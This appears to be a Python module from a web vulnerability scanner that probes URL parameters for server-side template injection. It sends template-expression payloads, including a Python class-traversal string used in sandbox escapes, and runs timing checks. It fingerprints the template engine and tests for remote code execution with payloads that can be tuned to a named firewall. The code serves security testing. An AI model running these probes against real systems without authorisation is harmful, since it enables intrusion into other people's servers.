import re, time
from typing import Optional
import requests

from tools.log_utils import get_logger
from tools.http_client import build_url
from tools.payload_engine import generate
from tools.settings import settings

logger = get_logger("ssti_detector")

TEMPLATE_ENGINE_FINGERPRINTS = {
    "jinja2": [r"\{\{999999\*999999\}\}", r"\{\{config\}\}"],
    "twig": [r"\{\{999999\*999999\}\}", r"\$\{999999\*999999\}"],
    "freemarker": [r"\$\{999999\*999999\}"],
    "velocity": [r"\$\{999999\*999999\}"],
    "smarty": [r"\{999999\*999999\}"],
    "handlebars": [r"\{\{999999\*999999\}\}"],
    "mustache": [r"\{\{999999\*999999\}\}"],
    "mako": [r"\$\{999999\*999999\}"],
    "tornado": [r"\{\{999999\*999999\}\}"],
    "django": [r"\{\{999999\*999999\}\}"],
    "angular": [r"\{\{999999\*999999\}\}"],
}


def _measure_baseline(url, param, sess, timeout):
    samples = []
    for _ in range(2):
        try:
            start = time.time()
            sess.get(build_url(url, param, "NOMINAL_TEST"), timeout=timeout)
            samples.append(time.time() - start)
        except Exception:
            pass
    return sum(samples) / len(samples) if samples else 0.3


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0, waf_name: Optional[str] = None) -> dict:
    if sess is None:
        sess = requests.Session()
        sess.verify = settings.verify_ssl
    result = {"vulnerable": False, "engine": None, "evidence": [], "payload": None,
              "rce_available": False}

    context = "numeric" if param.lower() in ("id", "uid", "pid", "page") else "string"

    seeds = generate("ssti", "detect", "all", waf_name)
    for entry in seeds:
        payload = entry["payload"]
        indicator = entry["indicator"]
        try:
            r = sess.get(build_url(url, param, payload), timeout=timeout)
            if indicator in r.text:
                result["vulnerable"] = True
                result["evidence"].append("ssti: %s => %s" % (payload[:25], indicator))
                result["payload"] = payload
                for engine, patterns in TEMPLATE_ENGINE_FINGERPRINTS.items():
                    for pat in patterns:
                        if re.search(pat, r.text):
                            result["engine"] = engine
                            break
                break
        except Exception as e:
            logger.debug("ssti payload %s: %s", payload[:20], e)

    if not result["vulnerable"] and context == "string":
        alt_pairs = [
            ('{{"a".toUpperCase()}}', "A", "javascript"),
            ('{{"a".upper()}}', "A", "python"),
            ('${"a".toUpperCase()}', "A", "java"),
            ('#{7+7}', "14", "java"),
        ]
        for payload, indicator, engine_hint in alt_pairs:
            try:
                r = sess.get(build_url(url, param, payload), timeout=timeout)
                if indicator in r.text:
                    result["vulnerable"] = True
                    result["evidence"].append("ssti: %s => %s (engine=%s)" % (payload[:25], indicator, engine_hint))
                    result["payload"] = payload
                    result["engine"] = engine_hint
                    break
            except Exception as e:
                logger.debug("ssti alt %s: %s", payload[:20], e)

    if not result["vulnerable"]:
        baseline = _measure_baseline(url, param, sess, timeout)
        if baseline >= timeout * 0.8:
            pass
        else:
            threshold = max(2.0, baseline * 1.5 + 1.5)
            time_payloads = [
                "{{ ''.__class__.__mro__[1].__subclasses__() and sleep(3) }}",
                "{% if 1==1 %}{% endif %}",
            ]
            for payload in time_payloads:
                try:
                    start = time.time()
                    sess.get(build_url(url, param, payload), timeout=timeout + 3)
                    if time.time() - start >= threshold:
                        result["vulnerable"] = True
                        result["evidence"].append("ssti: time-based anomaly detected")
                        result["payload"] = payload
                        break
                except requests.Timeout:
                    pass
                except Exception:
                    continue

    if result.get("vulnerable"):
        blind_seeds = generate("ssti", "blind", "all", waf_name)
        for entry in blind_seeds:
            payload = entry["payload"]
            indicator = entry["indicator"]
            try:
                r = sess.get(build_url(url, param, payload), timeout=timeout)
                if indicator in r.text:
                    result["rce_available"] = True
                    result["evidence"].append("ssti rce: %s" % payload[:30])
                    break
            except Exception as e:
                logger.debug("ssti blind %s: %s", payload[:20], e)

    return result
